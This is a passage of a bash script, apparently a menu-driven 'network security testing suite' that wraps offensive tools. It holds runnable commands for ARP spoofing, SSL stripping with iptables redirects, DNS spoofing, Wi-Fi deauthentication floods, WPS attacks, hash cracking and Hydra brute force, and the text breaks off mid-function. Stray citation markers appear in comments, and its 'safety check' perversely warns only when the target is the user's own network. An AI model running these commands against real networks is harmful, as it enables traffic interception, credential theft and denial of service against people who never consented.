#!/bin/bash

# Advanced Network Security Testing Suite
# For authorized testing on networks you own or have permission to test

# Enable strict error handling
set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global variables
SESSION_DIR=""
CURRENT_TARGET=""
CURRENT_INTERFACE=""
CONFIG_FILE="$HOME/.network_tester.conf"

# Error handling functions :cite[2]:cite[9]
yell() { echo -e "${RED}$0: $*${NC}" >&2; }
die() { yell "$*"; emergency_stop; exit 111; }
try() { "$@" || die "Cannot $*"; }

# Function to display header
header() {
    clear
    echo -e "${BLUE}==================================================${NC}"
    echo -e "${BLUE}        Advanced Network Security Testing Suite   ${NC}"
    echo -e "${BLUE}==================================================${NC}"
    if [ -n "$SESSION_DIR" ]; then
        echo -e "${YELLOW}Session: $(basename $SESSION_DIR)${NC}"
    fi
    if [ -n "$CURRENT_TARGET" ]; then
        echo -e "${YELLOW}Target: $CURRENT_TARGET${NC}"
    fi
    echo -e "${YELLOW}Use only on networks you have permission to test${NC}"
    echo -e "${YELLOW}Unauthorized access to computer systems is illegal${NC}"
    echo ""
}

# Function to check if tool is installed :cite[8]
check_tool() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${RED}$1 is not installed.${NC}"
        echo "Would you like to install it? (y/n)"
        read -r install_choice
        if [[ $install_choice == "y" || $install_choice == "Y" ]]; then
            sudo apt-get install $2 -y
        else
            return 1
        fi
    fi
    return 0
}

# Session management
setup_session() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    SESSION_DIR="sessions/session_$timestamp"
    mkdir -p $SESSION_DIR
    mkdir -p $SESSION_DIR/{logs,scans,captures,reports,evidence}
    
    echo "Session started: $timestamp" >> $SESSION_DIR/session.log
    echo -e "${GREEN}New session created: $SESSION_DIR${NC}"
    
    # Collect initial system state
    collect_evidence
}

# Logging functions
log_command() {
    local command="$1"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    echo "[$timestamp] $command" >> $SESSION_DIR/logs/command_history.log
}

log_event() {
    local event="$1"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    echo "[$timestamp] $event" >> $SESSION_DIR/logs/events.log
}

# Evidence collection
collect_evidence() {
    echo -e "${YELLOW}Collecting system evidence...${NC}"
    ifconfig > $SESSION_DIR/evidence/network_config.txt 2>/dev/null
    ip addr > $SESSION_DIR/evidence/ip_config.txt 2>/dev/null
    netstat -tulnp > $SESSION_DIR/evidence/active_connections.txt 2>/dev/null
    ps aux > $SESSION_DIR/evidence/running_processes.txt 2>/dev/null
    echo "Evidence collected at: $(date)" >> $SESSION_DIR/session.log
}

# Safety checks :cite[7]:cite[10]
safety_checks() {
    # Check if running as root
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}Some features require root privileges.${NC}"
        echo -e "${YELLOW}Please run with sudo for full functionality.${NC}"
        echo -e "${YELLOW}Press any key to continue or Ctrl+C to exit...${NC}"
        read -n 1 -s
    fi
    
    # Check if targeting own network
    if [ -n "$CURRENT_TARGET" ]; then
        local target_network=$(echo $CURRENT_TARGET | cut -d. -f1-3)
        local my_network=$(ip addr show 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d. -f1-3 | head -1)
        
        if [ "$target_network" = "$my_network" ]; then
            echo -e "${RED}WARNING: You are targeting your own network!${NC}"
            echo -e "${YELLOW}Are you sure you want to continue? (y/n)${NC}"
            read -r confirm
            if [ "$confirm" != "y" ]; then
                return 1
            fi
        fi
    fi
    
    return 0
}

# Emergency stop function :cite[2]
emergency_stop() {
    echo -e "${RED}EMERGENCY STOP ACTIVATED${NC}"
    log_event "EMERGENCY STOP ACTIVATED"
    
    # Kill all security tools
    pkill -f nmap
    pkill -f tcpdump
    pkill -f tshark
    pkill -f aireplay-ng
    pkill -f mdk4
    pkill -f bettercap
    pkill -f ettercap
    pkill -f sslstrip
    pkill -f dnschef
    
    # Reset iptables
    iptables -F 2>/dev/null
    iptables -t nat -F 2>/dev/null
    
    # Disable monitor mode if active
    if [ -n "$CURRENT_INTERFACE" ]; then
        sudo airmon-ng stop "${CURRENT_INTERFACE}mon" 2>/dev/null
        sudo service network-manager restart 2>/dev/null
    fi
    
    echo -e "${GREEN}All processes stopped and network reset${NC}"
    log_event "All processes stopped and network reset"
}

# AI-like tool recommendation system :cite[3]:cite[8]
recommend_tools() {
    local scenario="$1"
    
    case $scenario in
        "stealth_scan")
            echo -e "${CYAN}Recommended for stealth scanning:${NC}"
            echo "  - nmap -sS -T2 (Stealth SYN scan)"
            echo "  - masscan --rate=100 (Fast scan with rate limiting)"
            echo "  - unicornscan (Advanced scanner)"
            ;;
        "comprehensive_scan")
            echo -e "${CYAN}Recommended for comprehensive scanning:${NC}"
            echo "  - nmap -sS -sV -sC -O (Full TCP scan with version detection)"
            echo "  - nessus (Vulnerability scanner)"
            echo "  - openvas (Open source vulnerability scanner)"
            ;;
        "web_scan")
            echo -e "${CYAN}Recommended for web application scanning:${NC}"
            echo "  - nikto (Web server scanner)"
            echo "  - wapiti (Web application vulnerability scanner)"
            echo "  - dirb (Web content scanner)"
            echo "  - gobuster (Directory/file busting tool)"
            echo "  - sqlmap (SQL injection tool)"
            ;;
        "wireless_attack")
            echo -e "${CYAN}Recommended for wireless attacks:${NC}"
            echo "  - aireplay-ng (Wi-Fi attack tool)"
            echo "  - mdk4 (Modern Wi-Fi attack tool)"
            echo "  - reaver (WPS attack tool)"
            echo "  - bully (WPS attack tool)"
            ;;
        "password_attack")
            echo -e "${CYAN}Recommended for password attacks:${NC}"
            echo "  - john (Password cracker)"
            echo "  - hashcat (Advanced password recovery)"
            echo "  - hydra (Network logon cracker)"
            echo "  - medusa (Network service cracker)"
            ;;
        "network_sniffing")
            echo -e "${CYAN}Recommended for network sniffing:${NC}"
            echo "  - tcpdump (Command-line packet analyzer)"
            echo "  - tshark (Terminal Wireshark)"
            echo "  - wireshark (GUI packet analyzer)"
            echo "  - bettercap (Swiss army knife for network attacks)"
            ;;
        "mitm_attack")
            echo -e "${CYAN}Recommended for MITM attacks:${NC}"
            echo "  - arpspoof (ARP spoofing tool)"
            echo "  - ettercap (Comprehensive MITM suite)"
            echo "  - bettercap (Modern MITM framework)"
            echo "  - sslstrip (SSL stripping tool)"
            ;;
        "dns_spoofing")
            echo -e "${CYAN}Recommended for DNS spoofing:${NC}"
            echo "  - dnschef (DNS proxy for spoofing)"
            echo "  - ettercap (DNS spoofing capabilities)"
            echo "  - evilgrade (Advanced DNS spoofing framework)"
            ;;
        *)
            echo -e "${CYAN}General purpose tools:${NC}"
            echo "  - nmap (Network mapper)"
            echo "  - tcpdump (Packet analyzer)"
            echo "  - tshark (Packet analyzer)"
            ;;
    esac
}

# Automated reconnaissance
automated_recon() {
    header
    echo -e "${GREEN}Automated Reconnaissance${NC}"
    
    if [ -z "$CURRENT_TARGET" ]; then
        echo -e "${GREEN}Enter target IP or domain:${NC}"
        read -r CURRENT_TARGET
    fi
    
    echo -e "${YELLOW}Starting comprehensive reconnaissance on $CURRENT_TARGET...${NC}"
    log_event "Starting automated reconnaissance on $CURRENT_TARGET"
    
    # Create directory for recon data
    local recon_dir="$SESSION_DIR/recon_$(date +%Y%m%d_%H%M%S)"
    mkdir -p $recon_dir
    
    # WHOIS lookup
    echo -e "${CYAN}Performing WHOIS lookup...${NC}"
    whois $CURRENT_TARGET > $recon_dir/whois.txt 2>&1
    log_command "whois $CURRENT_TARGET"
    
    # DNS enumeration
    echo -e "${CYAN}Performing DNS enumeration...${NC}"
    dig $CURRENT_TARGET ANY > $recon_dir/dns_any.txt 2>&1
    dig $CURRENT_TARGET A > $recon_dir/dns_a.txt 2>&1
    dig $CURRENT_TARGET MX > $recon_dir/dns_mx.txt 2>&1
    dig $CURRENT_TARGET NS > $recon_dir/dns_ns.txt 2>&1
    log_command "dig $CURRENT_TARGET ANY"
    
    # Try subdomain discovery if it's a domain
    if [[ $CURRENT_TARGET =~ [a-zA-Z] ]]; then
        echo -e "${CYAN}Attempting subdomain discovery...${NC}"
        check_tool "sublist3r" "sublist3r"
        if [ $? -eq 0 ]; then
            sublist3r -d $CURRENT_TARGET > $recon_dir/subdomains.txt 2>&1
            log_command "sublist3r -d $CURRENT_TARGET"
        else
            echo "Sublist3r not available, trying manual method..."
            for sub in www ftp mail admin; do
                host $sub.$CURRENT_TARGET >> $recon_dir/subdomains_manual.txt 2>&1
            done
        fi
    fi
    
    # Service detection
    echo -e "${CYAN}Performing service detection...${NC}"
    nmap -sV --version-intensity 5 $CURRENT_TARGET > $recon_dir/service_detection.txt 2>&1
    log_command "nmap -sV --version-intensity 5 $CURRENT_TARGET"
    
    # Get recommendations based on findings
    echo -e "${CYAN}Analysis complete. Recommendations:${NC}"
    recommend_tools "comprehensive_scan"
    
    echo -e "${GREEN}Reconnaissance data saved to: $recon_dir${NC}"
    log_event "Reconnaissance completed on $CURRENT_TARGET"
    
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
}

# Function to get target information
get_target() {
    echo -e "${GREEN}Enter target IP, hostname, or network range:${NC}"
    read -r CURRENT_TARGET
    echo -e "${GREEN}Enter port(s) (default: common ports):${NC}"
    read -r ports
    if [[ -z "$ports" ]]; then
        ports="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080"
    fi
}

# Function to get network interface
get_interface() {
    echo -e "${GREEN}Enter network interface (e.g., eth0, wlan0):${NC}"
    read -r CURRENT_INTERFACE
}

# Function to get wireless interface in monitor mode
get_monitor_interface() {
    echo -e "${GREEN}Enter wireless interface (e.g., wlan0):${NC}"
    read -r wifi_interface
    
    echo -e "${YELLOW}Putting interface in monitor mode...${NC}"
    sudo airmon-ng check kill > /dev/null 2>&1
    sudo airmon-ng start $wifi_interface > /dev/null 2>&1
    CURRENT_INTERFACE="${wifi_interface}mon"
    echo -e "${GREEN}Monitor interface: $CURRENT_INTERFACE${NC}"
    log_event "Set monitor mode on $CURRENT_INTERFACE"
}

# Network sniffing function with multiple tools
network_sniff() {
    header
    echo -e "${GREEN}Network Sniffing Options${NC}"
    echo "1. Basic packet capture (tcpdump)"
    echo "2. Advanced packet analysis (tshark)"
    echo "3. GUI packet analysis (Wireshark)"
    echo "4. Analyze captured data"
    echo "5. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}Packet capture with tcpdump${NC}"
            check_tool "tcpdump" "tcpdump"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            local output_file="$SESSION_DIR/captures/capture_$(date +%Y%m%d_%H%M%S)"
            echo -e "${YELLOW}Running: sudo tcpdump -i $CURRENT_INTERFACE -w $output_file.pcap${NC}"
            log_command "sudo tcpdump -i $CURRENT_INTERFACE -w $output_file.pcap"
            sudo tcpdump -i $CURRENT_INTERFACE -w $output_file.pcap
            ;;
        2)
            echo -e "${YELLOW}Packet analysis with tshark${NC}"
            check_tool "tshark" "tshark"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${GREEN}Enter filter (e.g., 'tcp port 80'):${NC}"
            read -r filter
            local output_file="$SESSION_DIR/captures/capture_$(date +%Y%m%d_%H%M%S)"
            echo -e "${YELLOW}Running: sudo tshark -i $CURRENT_INTERFACE -f '$filter' -w $output_file.pcap${NC}"
            log_command "sudo tshark -i $CURRENT_INTERFACE -f '$filter' -w $output_file.pcap"
            sudo tshark -i $CURRENT_INTERFACE -f "$filter" -w $output_file.pcap
            ;;
        3)
            echo -e "${YELLOW}GUI packet analysis with Wireshark${NC}"
            check_tool "wireshark" "wireshark"
            echo -e "${YELLOW}Starting Wireshark GUI...${NC}"
            wireshark
            ;;
        4)
            echo -e "${YELLOW}Analyze captured data${NC}"
            check_tool "tshark" "tshark"
            echo -e "${GREEN}Enter capture file path:${NC}"
            read -r cap_file
            echo -e "${GREEN}Enter filter (e.g., 'http.request'):${NC}"
            read -r filter
            echo -e "${YELLOW}Running: tshark -r $cap_file -Y '$filter'${NC}"
            log_command "tshark -r $cap_file -Y '$filter'"
            tshark -r $cap_file -Y "$filter"
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
}

# Port scanning function with multiple tools
port_scan() {
    header
    echo -e "${GREEN}Port Scanning Options${NC}"
    echo "1. Quick scan (nmap)"
    echo "2. Comprehensive scan (nmap)"
    echo "3. Stealth scan (nmap)"
    echo "4. Version detection (nmap)"
    echo "5. Masscan (fast scanning)"
    echo "6. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    if [ -z "$CURRENT_TARGET" ]; then
        get_target
    fi
    
    local scan_file="$SESSION_DIR/scans/scan_$(date +%Y%m%d_%H%M%S).txt"
    
    case $option in
        1)
            echo -e "${YELLOW}Quick scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -F $CURRENT_TARGET${NC}"
            log_command "nmap -F $CURRENT_TARGET"
            nmap -F $CURRENT_TARGET | tee $scan_file
            ;;
        2)
            echo -e "${YELLOW}Comprehensive scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -sS -sV -sC -O -p $ports $CURRENT_TARGET${NC}"
            log_command "nmap -sS -sV -sC -O -p $ports $CURRENT_TARGET"
            nmap -sS -sV -sC -O -p $ports $CURRENT_TARGET | tee $scan_file
            ;;
        3)
            echo -e "${YELLOW}Stealth scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -sS -T2 -f $CURRENT_TARGET${NC}"
            log_command "nmap -sS -T2 -f $CURRENT_TARGET"
            nmap -sS -T2 -f $CURRENT_TARGET | tee $scan_file
            ;;
        4)
            echo -e "${YELLOW}Version detection with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -sV -sC $CURRENT_TARGET${NC}"
            log_command "nmap -sV -sC $CURRENT_TARGET"
            nmap -sV -sC $CURRENT_TARGET | tee $scan_file
            ;;
        5)
            echo -e "${YELLOW}Fast scanning with masscan${NC}"
            check_tool "masscan" "masscan"
            echo -e "${GREEN}Enter rate (packets/second, default: 1000):${NC}"
            read -r rate
            if [[ -z "$rate" ]]; then
                rate=1000
            fi
            echo -e "${YELLOW}Running: masscan -p$ports --rate=$rate $CURRENT_TARGET${NC}"
            log_command "masscan -p$ports --rate=$rate $CURRENT_TARGET"
            sudo masscan -p$ports --rate=$rate $CURRENT_TARGET | tee $scan_file
            ;;
        6)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    
    echo -e "${GREEN}Scan results saved to: $scan_file${NC}"
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
}

# Vulnerability assessment function with multiple tools
vuln_assessment() {
    header
    echo -e "${GREEN}Vulnerability Assessment Options${NC}"
    echo "1. Basic vulnerability scan (nmap)"
    echo "2. Web application scan (nikto)"
    echo "3. Web application scan (OWASP ZAP)"
    echo "4. Network service scan (nmap)"
    echo "5. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    if [ -z "$CURRENT_TARGET" ]; then
        get_target
    fi
    
    local vuln_file="$SESSION_DIR/scans/vuln_scan_$(date +%Y%m%d_%H%M%S).txt"
    
    case $option in
        1)
            echo -e "${YELLOW}Vulnerability scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap --script vuln $CURRENT_TARGET${NC}"
            log_command "nmap --script vuln $CURRENT_TARGET"
            nmap --script vuln $CURRENT_TARGET | tee $vuln_file
            ;;
        2)
            echo -e "${YELLOW}Web application scan with nikto${NC}"
            check_tool "nikto" "nikto"
            echo -e "${GREEN}Enter URL (e.g., http://$CURRENT_TARGET):${NC}"
            read -r url
            echo -e "${YELLOW}Running: nikto -h $url${NC}"
            log_command "nikto -h $url"
            nikto -h $url | tee $vuln_file
            ;;
        3)
            echo -e "${YELLOW}Web application scan with OWASP ZAP${NC}"
            check_tool "zap-cli" "zap-cli"
            echo -e "${GREEN}Enter URL (e.g., http://$CURRENT_TARGET):${NC}"
            read -r url
            echo -e "${YELLOW}Running: zap-cli quick-scan $url${NC}"
            log_command "zap-cli quick-scan $url"
            zap-cli quick-scan $url | tee $vuln_file
            ;;
        4)
            echo -e "${YELLOW}Network service scan with nmap${NC}"
            check_tool "nmap" "nmap"
            echo -e "${YELLOW}Running: nmap -sS -sV --script safe $CURRENT_TARGET${NC}"
            log_command "nmap -sS -sV --script safe $CURRENT_TARGET"
            nmap -sS -sV --script safe $CURRENT_TARGET | tee $vuln_file
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    
    echo -e "${GREEN}Vulnerability scan results saved to: $vuln_file${NC}"
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
}

# MITM Attack function with multiple tools :cite[1]:cite[7]
mitm_attack() {
    header
    echo -e "${GREEN}MITM Attack Options${NC}"
    echo "1. ARP Spoofing (arpspoof)"
    echo "2. Bettercap (comprehensive MITM)"
    echo "3. Ettercap (GUI and CLI options)"
    echo "4. SSL Stripping (sslstrip)"
    echo "5. DHCP Spoofing"
    echo "6. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}ARP Spoofing with arpspoof${NC}"
            check_tool "arpspoof" "dsniff"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${GREEN}Enter target IP:${NC}"
            read -r target_ip
            echo -e "${GREEN}Enter gateway IP:${NC}"
            read -r gateway_ip
            
            echo -e "${YELLOW}Enabling IP forwarding...${NC}"
            sudo sysctl -w net.ipv4.ip_forward=1
            
            echo -e "${YELLOW}Starting ARP spoofing between $target_ip and $gateway_ip${NC}"
            log_command "sudo arpspoof -i $CURRENT_INTERFACE -t $target_ip $gateway_ip"
            sudo arpspoof -i $CURRENT_INTERFACE -t $target_ip $gateway_ip &
            arpspoof_pid1=$!
            
            log_command "sudo arpspoof -i $CURRENT_INTERFACE -t $gateway_ip $target_ip"
            sudo arpspoof -i $CURRENT_INTERFACE -t $gateway_ip $target_ip &
            arpspoof_pid2=$!
            
            echo -e "${GREEN}ARP spoofing running. Press any key to stop...${NC}"
            read -n 1 -s
            sudo kill $arpspoof_pid1 $arpspoof_pid2 2>/dev/null
            echo -e "${YELLOW}ARP spoofing stopped${NC}"
            log_event "ARP spoofing stopped"
            ;;
        2)
            echo -e "${YELLOW}Comprehensive MITM with Bettercap${NC}"
            check_tool "bettercap" "bettercap"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${YELLOW}Starting Bettercap on interface $CURRENT_INTERFACE${NC}"
            log_command "sudo bettercap -iface $CURRENT_INTERFACE"
            sudo bettercap -iface $CURRENT_INTERFACE
            ;;
        3)
            echo -e "${YELLOW}MITM with Ettercap${NC}"
            check_tool "ettercap" "ettercap-graphical"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${GREEN}Choose Ettercap mode:${NC}"
            echo "1. Text mode"
            echo "2. Graphical mode"
            echo "3. Curses mode"
            read -r ettercap_mode
            
            case $ettercap_mode in
                1)
                    log_command "sudo ettercap -T -i $CURRENT_INTERFACE"
                    sudo ettercap -T -i $CURRENT_INTERFACE
                    ;;
                2)
                    log_command "sudo ettercap -G -i $CURRENT_INTERFACE"
                    sudo ettercap -G -i $CURRENT_INTERFACE
                    ;;
                3)
                    log_command "sudo ettercap -C -i $CURRENT_INTERFACE"
                    sudo ettercap -C -i $CURRENT_INTERFACE
                    ;;
                *)
                    echo -e "${RED}Invalid option${NC}"
                    ;;
            esac
            ;;
        4)
            echo -e "${YELLOW}SSL Stripping with sslstrip${NC}"
            check_tool "sslstrip" "sslstrip"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${GREEN}Enter port to redirect (default: 8080):${NC}"
            read -r sslstrip_port
            if [[ -z "$sslstrip_port" ]]; then
                sslstrip_port=8080
            fi
            
            echo -e "${YELLOW}Setting up iptables rules...${NC}"
            sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $sslstrip_port
            
            echo -e "${YELLOW}Starting sslstrip on port $sslstrip_port${NC}"
            log_command "sudo sslstrip -l $sslstrip_port -w $SESSION_DIR/captures/sslstrip_log.txt"
            sudo sslstrip -l $sslstrip_port -w $SESSION_DIR/captures/sslstrip_log.txt &
            sslstrip_pid=$!
            
            echo -e "${GREEN}SSL stripping running. Press any key to stop...${NC}"
            read -n 1 -s
            sudo kill $sslstrip_pid 2>/dev/null
            sudo iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $sslstrip_port
            echo -e "${YELLOW}SSL stripping stopped${NC}"
            log_event "SSL stripping stopped"
            ;;
        5)
            echo -e "${YELLOW}DHCP Spoofing${NC}"
            check_tool "dhcpspoof" "yersinia"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${YELLOW}Starting DHCP spoofing on interface $CURRENT_INTERFACE${NC}"
            log_command "sudo yersinia -G -I $CURRENT_INTERFACE"
            sudo yersinia -G -I $CURRENT_INTERFACE
            ;;
        6)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
}

# DNS Spoofing function with multiple tools :cite[7]:cite[10]
dns_spoof() {
    header
    echo -e "${GREEN}DNS Spoofing Options${NC}"
    echo "1. DNSchef (Python-based)"
    echo "2. Ettercap DNS spoofing"
    echo "3. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}DNS Spoofing with DNSchef${NC}"
            check_tool "dnschef" "dnschef"
            if [ $? -eq 1 ]; then return; fi
            
            get_interface
            echo -e "${GREEN}Enter IP address to redirect requests to:${NC}"
            read -r redirect_ip
            echo -e "${GREEN}Enter domain to spoof (leave empty for all domains):${NC}"
            read -r spoof_domain
            
            local_ip=$(ip addr show $CURRENT_INTERFACE 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
            
            if [[ -z "$spoof_domain" ]]; then
                echo -e "${YELLOW}Redirecting all domains to $redirect_ip${NC}"
                log_command "sudo dnschef -i $redirect_ip --interface $local_ip"
                sudo dnschef -i $redirect_ip --interface $local_ip &
            else
                echo -e "${YELLOW}Redirecting $spoof_domain to $redirect_ip${NC}"
                log_command "sudo dnschef --fakedomains=$spoof_domain=$redirect_ip --interface $local_ip"
                sudo dnschef --fakedomains=$spoof_domain=$redirect_ip --interface $local_ip &
            fi
            
            dnschef_pid=$!
            
            echo -e "${GREEN}DNS spoofing running. Press any key to stop...${NC}"
            read -n 1 -s
            sudo kill $dnschef_pid 2>/dev/null
            echo -e "${YELLOW}DNS spoofing stopped${NC}"
            log_event "DNS spoofing stopped"
            ;;
        2)
            echo -e "${YELLOW}DNS Spoofing with Ettercap${NC}"
            check_tool "ettercap" "ettercap-graphical"
            if [ $? -eq 1 ]; then return; fi
            
            echo -e "${YELLOW}Create a DNS spoof configuration file first${NC}"
            echo -e "${GREEN}Enter domain to spoof:${NC}"
            read -r spoof_domain
            echo -e "${GREEN}Enter IP address to redirect to:${NC}"
            read -r redirect_ip
            
            echo "$spoof_domain A $redirect_ip" > $SESSION_DIR/etter.dns
            echo -e "${YELLOW}Created etter.dns file with spoofing rule${NC}"
            
            get_interface
            echo -e "${YELLOW}Starting Ettercap for DNS spoofing${NC}"
            log_command "sudo ettercap -T -i $CURRENT_INTERFACE -P dns_spoof -f $SESSION_DIR/etter.dns // //"
            sudo ettercap -T -i $CURRENT_INTERFACE -P dns_spoof -f $SESSION_DIR/etter.dns // //
            ;;
        3)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
}

# Wireless client kicking function with multiple tools
wireless_kick() {
    header
    echo -e "${GREEN}Wireless Attack Options${NC}"
    echo "1. Deauthentication attack (aireplay-ng)"
    echo "2. MDK4 deauthentication"
    echo "3. WPA/WPA2 handshake capture"
    echo "4. WPS attack (reaver)"
    echo "5. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}Deauthentication attack with aireplay-ng${NC}"
            check_tool "aireplay-ng" "aircrack-ng"
            if [ $? -eq 1 ]; then return; fi
            
            get_monitor_interface
            echo -e "${GREEN}Enter target BSSID:${NC}"
            read -r bssid
            echo -e "${GREEN}Enter target client MAC (leave empty for all clients):${NC}"
            read -r client_mac
            echo -e "${GREEN}Enter number of deauth packets to send (0 for continuous):${NC}"
            read -r deauth_count
            
            if [[ -z "$deauth_count" || $deauth_count -eq 0 ]]; then
                deauth_count=0
            fi
            
            if [[ -z "$client_mac" ]]; then
                echo -e "${YELLOW}Running: sudo aireplay-ng --deauth $deauth_count -a $bssid $CURRENT_INTERFACE${NC}"
                log_command "sudo aireplay-ng --deauth $deauth_count -a $bssid $CURRENT_INTERFACE"
                sudo aireplay-ng --deauth $deauth_count -a $bssid $CURRENT_INTERFACE
            else
                echo -e "${YELLOW}Running: sudo aireplay-ng --deauth $deauth_count -a $bssid -c $client_mac $CURRENT_INTERFACE${NC}"
                log_command "sudo aireplay-ng --deauth $deauth_count -a $bssid -c $client_mac $CURRENT_INTERFACE"
                sudo aireplay-ng --deauth $deauth_count -a $bssid -c $client_mac $CURRENT_INTERFACE
            fi
            ;;
        2)
            echo -e "${YELLOW}Deauthentication attack with MDK4${NC}"
            check_tool "mdk4" "mdk4"
            if [ $? -eq 1 ]; then return; fi
            
            get_monitor_interface
            echo -e "${GREEN}Enter target BSSID:${NC}"
            read -r bssid
            
            echo -e "${YELLOW}Running: sudo mdk4 $CURRENT_INTERFACE d -b $bssid${NC}"
            log_command "sudo mdk4 $CURRENT_INTERFACE d -b $bssid"
            sudo mdk4 $CURRENT_INTERFACE d -b $bssid
            ;;
        3)
            echo -e "${YELLOW}WPA/WPA2 Handshake Capture${NC}"
            check_tool "airodump-ng" "aircrack-ng"
            if [ $? -eq 1 ]; then return; fi
            
            get_monitor_interface
            echo -e "${GREEN}Enter target BSSID:${NC}"
            read -r bssid
            echo -e "${GREEN}Enter channel:${NC}"
            read -r channel
            echo -e "${GREEN}Enter output file name:${NC}"
            read -r output_file
            
            echo -e "${YELLOW}Starting capture on channel $channel${NC}"
            log_command "sudo airodump-ng -c $channel --bssid $bssid -w $SESSION_DIR/captures/$output_file $CURRENT_INTERFACE"
            sudo airodump-ng -c $channel --bssid $bssid -w $SESSION_DIR/captures/$output_file $CURRENT_INTERFACE
            
            echo -e "${YELLOW}Now run a deauth attack to capture the handshake${NC}"
            ;;
        4)
            echo -e "${YELLOW}WPS Attack with Reaver${NC}"
            check_tool "reaver" "reaver"
            if [ $? -eq 1 ]; then return; fi
            
            get_monitor_interface
            echo -e "${GREEN}Enter target BSSID:${NC}"
            read -r bssid
            echo -e "${GREEN}Enter channel:${NC}"
            read -r channel
            
            echo -e "${YELLOW}Running: sudo reaver -i $CURRENT_INTERFACE -b $bssid -c $channel -vv${NC}"
            log_command "sudo reaver -i $CURRENT_INTERFACE -b $bssid -c $channel -vv"
            sudo reaver -i $CURRENT_INTERFACE -b $bssid -c $channel -vv
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
}

# Password attacks function :cite[4]
password_attacks() {
    header
    echo -e "${GREEN}Password Attack Options${NC}"
    echo "1. Hash cracking (John the Ripper)"
    echo "2. Hash cracking (Hashcat)"
    echo "3. Network brute force (Hydra)"
    echo "4. Wordlist generation (crunch)"
    echo "5. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}Hash cracking with John the Ripper${NC}"
            check_tool "john" "john"
            echo -e "${GREEN}Enter path to hash file:${NC}"
            read -r hash_file
            echo -e "${GREEN}Enter wordlist path (press enter for default):${NC}"
            read -r wordlist
            if [[ -z "$wordlist" ]]; then
                echo -e "${YELLOW}Running: john $hash_file${NC}"
                log_command "john $hash_file"
                john $hash_file
            else
                echo -e "${YELLOW}Running: john --wordlist=$wordlist $hash_file${NC}"
                log_command "john --wordlist=$wordlist $hash_file"
                john --wordlist=$wordlist $hash_file
            fi
            ;;
        2)
            echo -e "${YELLOW}Hash cracking with Hashcat${NC}"
            check_tool "hashcat" "hashcat"
            echo -e "${GREEN}Enter path to hash file:${NC}"
            read -r hash_file
            echo -e "${GREEN}Enter wordlist path:${NC}"
            read -r wordlist
            echo -e "${GREEN}Enter hash type (e.g., 0 for MD5, 1000 for NTLM):${NC}"
            read -r hash_type
            echo -e "${YELLOW}Running: hashcat -m $hash_type -a 0 $hash_file $wordlist${NC}"
            log_command "hashcat -m $hash_type -a 0 $hash_file $wordlist"
            hashcat -m $hash_type -a 0 $hash_file $wordlist
            ;;
        3)
            echo -e "${YELLOW}Network brute force with Hydra${NC}"
            check_tool "hydra" "hydra"
            if [ -z "$CURRENT_TARGET" ]; then
                get_target
            fi
            echo -e "${GREEN}Enter service to attack (ssh, ftp, http-form, etc.):${NC}"
            read -r service
            echo -e "${GREEN}Enter username or path to userlist:${NC}"
            read -r user
            echo -e "${GREEN}Enter password or path to passlist:${NC}"
            read -r pass
